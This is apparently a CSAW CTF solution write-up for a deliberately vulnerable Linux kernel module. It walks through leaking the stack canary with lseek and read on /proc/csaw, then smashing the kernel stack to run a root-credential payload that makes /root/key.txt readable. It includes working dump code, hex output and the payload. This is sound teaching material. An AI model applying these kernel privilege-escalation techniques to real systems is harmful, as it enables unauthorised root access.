The Solution
=============
Ok, that should be enough! Now to the actual solution.

It’s quite obvious that there is a vulnerability in csaw_write(). After all, the comment in the source code even comes right out and says that the copy_from_user with an attacker-provided ubuf and count can overflow the buffer on the kernel stack:

```
if (copy_from_user(&buf, ubuf, count)) {
    printk(KERN_INFO "csaw: error copying data from userspace\n");
    return -EFAULT;
}
```

An attacker can easily smash the kernel stack by writing a long string to /proc/csaw!

However, as also specified in the comment, the kernel has been compiled with stack canaries, allowing the kernel to detect and panic when a stack smashing attack is attempted.  In the case of our challenge, the stack canary has been set to a static value that never changes, but is still unknown to the attacker.

So how can the attacker work around this roadblock?  Well, in order to bypass the canary, the attacker needs to know its value so it can smash the stack while maintaining the integrity of the canary.  The attacker can try to guess the value via bruteforce methods, but that would be a rather fruitless attempt.

Alternately, the attacker could attempt to discover the canary value through a kernel memory disclosure vulnerability.  While kmem disclosures aren’t uncommon, the provided kernel was patched up against all publicly-known vulnerabilities at the time of the competition.  So let’s take a closer look at the csaw.c source code…after all, there’s only a handful of lines to audit.

Let’s take a look at code in csaw_read():

```c
strcpy(buf, "Welcome to the CSAW CTF challenge. Best of luck!\n");
memcpy(page, buf + off, MAX_LENGTH);
```

Looks pretty vanilla at first, we’re just copying the string to the output buffer page used by the read_proc function.  But wait, what is that “buf + off” for? That looks a little suspicious!

Indeed, since the proc interface acts just like a file, it is possible to lseek(2) on the open file description, causing the off variable passed to csaw_read() to be non-zero.  If off is non-zero, we’ll be memcpy’ing memory back to userspace that is past our buffer on the kernel stack.  Guess what’s just past our buffer?  The stack canary!

So we can dump kernel memory like so:

```c
fd = open("/proc/csaw", O_RDWR);
if (fd < 0) {
    printf("[-] failed to open /proc/csaw\n");
    exit(1);
}

lseek(fd, 16, SEEK_CUR);
bytes = read(fd, buf, sizeof(buf));

printf("dumping memory...\n\n");
print_hex_dump(16, 1, buf, 64, 1);
```

Compiling and running this exploit results in:

```
csaw@csaw exploit $ ./dump
dumping memory...

65 2e 20 42 65 73 74 20 6f 66 20 6c 75 63 6b 21  e. Best of luck!
0a 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
24 24 24 24 4c 3f b9 df 80 6a c2 de 40 00 00 00  $$$$L?...j..@...
68 a1 97 bf f9 8a 04 08 24 53 78 b7 f4 4f 78 b7  h.......$Sx..Ox.
```

What is that “$$$$” in there?!? Why, it’s our stack canary being dumped out!

Once we have the canary, we can perform a trivial stack smash, making sure to overwrite the canary with it’s correct cash-money value and then overwriting the return address with the address of our privesc payload mapped somewhere in userspace (see [enlightenment](http://www.grsecurity.net/~spender/enlightenment.tgz)’s exp_powerglove.c if you’re unfamiliar with basic kernel stack smashes).

I chose a very simple chmod payload since we have ksym access and can simply call into any existing kernel functions from our payload:

```c
static void
kernel_code(void)
{
    commit_creds(prepare_kernel_cred(0));
    sys_chmod("/root", 0777);
    sys_chmod("/root/key.txt", 0777);
    return;
}
```

That’s it! The flag contained in /root/key.txt is now yours!  During the CTF, only one team (ppp1 from CMU) successfully solved it within the allotted time period.  While that might seem low, there were a lot of difficult challenges and not a lot of time to solve them.

Hope you enjoyed it!
